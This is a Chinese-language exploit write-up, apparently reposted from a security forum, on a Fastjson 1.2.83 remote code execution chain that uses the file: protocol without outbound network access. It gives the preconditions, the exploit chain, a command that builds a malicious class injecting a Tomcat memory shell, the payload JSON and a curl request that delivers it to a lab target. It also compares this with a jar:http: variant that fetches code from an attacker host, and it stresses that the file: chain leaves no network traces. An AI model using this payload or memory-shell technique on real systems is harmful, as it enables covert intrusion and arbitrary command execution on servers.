# Fastjson 1.2.83 file: 协议不出网利用分析
> 来源：https://xz.aliyun.com/news/92551

## 1\. 版本信息

  

| 项目 | 内容 |
| --- | --- |
| 组件 | com.alibaba:fastjson |
| 影响版本 | 1.2.68 ~ 1.2.83（本报告实测 1.2.83） |
| 利用协议 | file: 协议（无需出网） |
| JDK 版本 | JDK 8（本机实测 Zulu 1.8.0_492） |
| 操作系统 | macOS arm64 / Linux 均可 |

  

## 2\. 利用条件

  

| 条件 | 说明 |
| --- | --- |
| ① Fastjson 1.2.68~1.2.83 | 含 @JSONType 资源探测逻辑 |
| ② SafeMode = false（默认） | true 则入口直接阻断 |
| ③ JSON.parse 接收不可信输入 | 业务把攻击者 JSON 送进 parse |
| ④ URL 型 ClassLoader | 典型：Spring Boot FatJar LaunchedURLClassLoader |
| ⑤ 恶意 class 文件已落盘 | 通过文件上传/路径穿越/日志写马等途径预先写入目标磁盘 |
| ⑥ AutoType 开或关均可 | 关闭不能免疫（核心误区） |

  

## 3\. 利用链

  

```
JSON.parse(payload)                    // 入口：不可信 JSON
  │  "@type":"file:.tmp.Shell_xxxx"
  ▼
ParserConfig.checkAutoType()
  │
  ├─ SafeMode? ──是──► 阻断 ✗
  │
  └─ 资源探测（autoTypeSupport=false 也走这里）:
       resource = typeName.replace('.', '/') + ".class"
       "file:.tmp.Shell_xxxx"  →  "file:/tmp/Shell_xxxx.class"
       │
       ▼
     ClassLoader.getResourceAsStream("file:/tmp/Shell_xxxx.class")
       │  LaunchedURLClassLoader 将 file: URL 当做本地文件读取
       │  【无网络请求，不出网】
       ▼
     ClassReader 扫描字节码 → 发现 @JSONType → jsonType = true
       │
       ▼
     TypeUtils.loadClass() → defineClass → <clinit> 执行:
       │
       ├─ 写 /tmp/MEMSHELL_RCE_OK（RCE 标记）
       ├─ Base64.decode(VB64) → CommandValve.class → defineClass
       ├─ Base64.decode(IB64) → MemShellInjector.class → defineClass
       └─ Injector.inject(valveClass)
            │
            ▼
          Tomcat Pipeline ← CommandValve 注入
            │ GET /exec?cmd=xxx
            └─ Runtime.exec(cmd) → 回显
```

关键点：  
  
1 `@type` 中的 `.` 被替换为 `/`，然后拼接 `.class`，所以 `file:.tmp.Shell_xxxx` → `file:/tmp/Shell_xxxx.class`  
2 `LaunchedURLClassLoader.getResourceAsStream` 把 `file:` URL 当本地文件读，全程无出网  
3 恶意 class 带有 `@com.alibaba.fastjson.annotation.JSONType` → `autoTypeSupport=false` 被绕过  
4 所有注入逻辑在 `<clinit>` 中完成：Base64 解码 → `defineClass` → 注入 Tomcat Pipeline  

## 4\. 复现流程

  

### 4.1 生成恶意 class

  

```bash
java -cp "memshell-bypass:poc-jsontype/lib/asm-9.6.jar:poc-jsontype/lib/fastjson-1.2.83.jar:~/.m2/repository/org/apache/tomcat/embed/tomcat-embed-core/9.0.83/tomcat-embed-core-9.0.83.jar" \
  MemShellGen /tmp/MemShell.class
```

输出：  
  

```
[*] Valve: 2477 bytes, Injector: 6314 bytes
[*] b64 lengths: valve=3304 injector=8420
[+] Written 13802 bytes to /tmp/MemShell.class

[*] Payload (NO outbound HTTP):
  {"@type":"file:.tmp.MemShell","x":1}
```

### 4.2 启动靶场

  
  ```bash
  java \
    -jar fastjsn-rce-env-1.0.0.jar \
    --server.port=18080 &

  curl http://localhost:18080/info
  # → {"autoTypeSupport":false,"safeMode":false,...}
```

### 4.3 发送 Payload（不出网）

  

```bash
curl -X POST http://localhost:18080/parse \
  -H 'Content-Type: application/json' \
  -d '{"@type":"file:.tmp.MemShell","x":1}' \
  -x 127.0.0.1:8080
```

靶场返回：  
  

```json
{"ok":true,"class":"file:.tmp.MemShell","result":"file:.tmp.MemShell@21e90e88"}
```

  
  

![image-20260721181113907.png](https://i.im.ge/QMVn8Q4/p2m-774a1f679c.png)

  
  

### 4.4 验证命令执行

  

![image-20260721181241600.png](https://i.im.ge/QMVnRLC/p2m-910d956a39.png)

  
  

## 5\. file: 协议 vs jar:http: 协议对比

  

| 维度 | file: 协议（不出网） | jar:http: 协议（出网） |
| --- | --- | --- |
| Payload | {"@type":"file:.tmp.xxx","x":1} | {"@type":"jar:http:..IP:PORT.probe!.POC","x":1} |
| 是否需要出网 | ❌ 不需要 | ✅ 需要 HTTP 拉 JAR |
| class 来源 | 本地磁盘文件 | 远程 HTTP 服务器 |
| 前提条件 | class 文件需预先落盘 | 攻击机 HTTP 服务可达 |
| 隐蔽性 | 无网络痕迹 | 产生 HTTP 外连 |
| JDK 版本 | JDK 8 | JDK 8（完整 RCE）；JDK 9+ 仅 SSRF |
| autoTypeSupport | 关闭仍可攻击 | 关闭仍可攻击 |
| SafeMode | true 可阻断 | true 可阻断 |

  
核心差异：  
  
● `jar:http:` 链 = 简单但需要出网，JDK 8 下 `defineClass` 成功 → 直接 RCE，JDK 9+ 被 `ClassFormatError` 阻断（降级为 SSRF）  
● `file:` 链 = 需要 class 预先落盘，但完全不产生网络流量，适合不出网 / 隔离网环境
